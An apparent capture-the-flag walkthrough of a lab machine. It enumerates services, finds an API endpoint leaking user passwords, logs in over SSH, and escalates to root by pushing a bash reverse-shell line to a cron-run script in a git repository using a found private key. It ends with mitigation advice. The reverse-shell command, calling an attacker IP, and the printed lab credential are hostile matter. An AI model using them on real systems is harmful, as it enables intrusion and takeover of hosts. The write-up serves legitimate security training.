## Introduction

In this walkthrough, we will conduct an enumeration of a web application to identify an API endpoint that exposes sensitive user data. By exploiting this endpoint, we can gain SSH access to the system as a low-privileged user. Our next objective is to locate a private SSH key associated with the git user, enabling us to push arbitrary changes to the master branch of a local repository. The system is configured with two root-owned cron jobs, one of which references a file stored in the git repository. After injecting reverse shell and pushing changes to this file, we escalate our privileges. Let’s start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 12445 (netbios-ssn)

```bash
smbclient -L  //$IP/ -N -p 12445
```

![image.png](image%203.png)

```bash
smbclient  //$IP/Commander -N -p 12445
RECURSE ON
PROMPT OFF
mget *
python3 -m http.server 80
```

All files are related to Kotlin programming language and I didn’t find anything interesting in them.

### Port 43022 (SSH)

We usually skip SSH.

## Web

### Port 18030 (HTTP)

Just a game.

### Port 8080 (HTTP)

- Version - Apache Tomcat

```bash
feroxbuster -u http://$IP:8080/-C 404,403,400 -w /usr/share/wordlists/dirb/common.txt
```

I tried logging in using names as their passwords for the users but it didn’t work.

## Loot

- [ ]  Thoroughly analyze Commander share files
- [ ]  Users: Jennifer, Julie, James

## Exploitation

When analyzing page source codes of articles we can see `api` endpoint, accessing it we are actually redirected to `/api/` in contrast `/api` didn’t work, this is how the server is configured. It expects a trailing slash at the end.

Accessing `/api/`  we can another endpoint called `/user/` and there we can find user passwords.

![image.png](image%205.png)

We have seen the name `dademola` already in shares so let’s try to connect as that user using ssh.

```bash
ssh dademola@$IP -p 43022
```

## Credentials

```bash
dademola : ExplainSlowQuest110
```

And it actually worked:

![image.png](image%206.png)

## Privilege Escalation

Visiting `shared` we can see that share that we have seen before is this directory.

`backups.sh` is executed every 3 minutes and `pull.sh` is executed every 2 minutes:

![image.png](image%208.png)

We can see `/git-server` directory under `/`  directory, going there we can see that it is a [bare](https://www.theserverside.com/blog/Coffee-Talk-Java-News-Stories-and-Opinions/What-is-a-bare-git-repository) git repo.

> **If a folder contains a `.git` directory**, it is a **non-bare repository**, typically used for development. You **should not push to it directly**, because Git protects the working directory from being overwritten.
**If a folder does not contain a `.git` directory but instead looks like the inside of one** (e.g., it has `HEAD`, `objects/`, `refs/`, etc.), then it is a **bare repository**, and **it's safe to push to it**, since there is no working directory to conflict with.
{: .prompt-info }

So we are gonna clone that repo to other directory, and will be able to make changes in it and push.

```bash
git clone file:///git-server/
```

- Git interprets `file:///` as "access this repository from the local file system" rather than from a remote server.
- The path `/git-server/` must be a **bare Git repository** (i.e., a repo intended for sharing, usually ending in `.git` and lacking a working directory).
- Git creates a **clone** (a complete copy) of the repo in the current directory or a specified one.

![image.png](image%209.png)

![image.png](image%2010.png)

After cloning bare-repo we have now a [non-bare](https://coderefinery.github.io/git-collaborative/bare-repos/) repo and git reconstructed a file from the last commit that’s why we can now see `backups.sh` file. 

Running

```bash
git log
```

we can see commit history, all commits are done by our user.

![image.png](image%2011.png)

To make changes in `backup.sh` file and injecting our reverse shell we first should set our identity for future commits.

```bash
git config --global user.email "dade@local.host"
git config --global user.name "Dademola"
```

![image.png](image%2012.png)

Now let’s inject a reverse shell in that file:

```bash
echo "bash -c 'bash -i >& /dev/tcp/192.168.45.155/8080 0>&1'" > backups.sh
chmod +x backups.sh
git add -A
git commit -m "update"
git push origin master
```

We encountered an error saying that `error: remote unpack failed: unable to create temporary object directory` that means we cannot write to remote repository, let’s check it:

![image.png](image%2013.png)

You see we don’t have write permissions over the remote repository, but user `git` does.

I found `.ssh` folder under `git` and its private key too.

```bash
ssh git@$IP -i id_rsa -p 43022
```

![image.png](image%2014.png)

We have seen `git-shell-commands` directory under `git` user home, `git` user here is special user that can run just git shell commands.


> It’s commonly used in setups where users access a Git repository over SSH but shouldn’t have full command-line access to the server.
{: .prompt-info }

[Git Shell](https://linux.die.net/man/1/git-shell)

Currently, only four commands are permitted to be called, `git-receive-pack`, `git-upload-pack` and `git-upload-archive` with a single required argument, or `cvs server` (to invoke `git-cvsserver`). Let’s do this using ssh.

### **Git commands using SSH**

[Git commands using SSH](https://kashz.gitbook.io/kashz-jewels/tricks/git-commands#git-commands-using-ssh)

```bash
GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes [-p PORT]' GIT COMMAND HERE

# git clone over ssh
GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes [-p PORT]' git clone user@IP:/PATH-TO-GIT
```

Now I am gonna use this method 

```bash
GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes -p 43022' git clone git@$IP:/git-server
```

![image.png](image%2015.png)

![image.png](image%2016.png)

```bash
git config --global user.email "git@local.host"
git config --global user.name "git"
git add -A
git commit -m "update2"
```

But in order to push we should use our private key, because as it was already said:

- **`user.email` and `user.name`**
    - Only set your **identity in commits** (who made the changes).
    - **Do not authenticate** you with the remote server.
- **SSH Key (`id_rsa`)**
    - Required for **actual authentication** when pushing/pulling over SSH.
    - Without it, Git won’t know how to verify your access to the remote repo.

```bash
GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes -p 43022' git push origin master
```

![image.png](image%2017.png)

It worked, we are gonna wait for a reverse connection, let’s just check it again to be sure.

For that we can go bare repo and see latest commits:

```bash
cd /git-server
git log
```

Now we are root!

## Mitigation

- **API Security:** Ensure that sensitive user data is properly protected by applying strict access controls and sanitizing all inputs and outputs. Additionally, implement rate limiting, logging, and monitoring to detect any unusual activity or potential abuse of API endpoints.
- **SSH Key Management:** Enforce best practices for SSH key management, including the use of strong, unique keys, and storing them securely. Regularly audit SSH keys and ensure they are only granted to authorized users.
- **Cron Job Security:** Validate and restrict the permissions of files referenced by cron jobs. Files should be stored in secure locations with appropriate access controls, and cron jobs should be configured to run with the minimum necessary privileges. Avoid using files in repositories that can be easily manipulated.
- **Repository Security:** Implement strict access controls and code review processes for repositories to prevent unauthorized modifications. Use Git hooks or similar tools to ensure code integrity before accepting changes. Additionally, clone operations should be carefully monitored to prevent the introduction of malicious code.
- **Privilege Escalation Prevention:** Apply the principle of least privilege to all user accounts and restrict access to critical system resources. Employ tools such as SELinux or AppArmor to restrict unauthorized access and reduce the potential for privilege escalation.
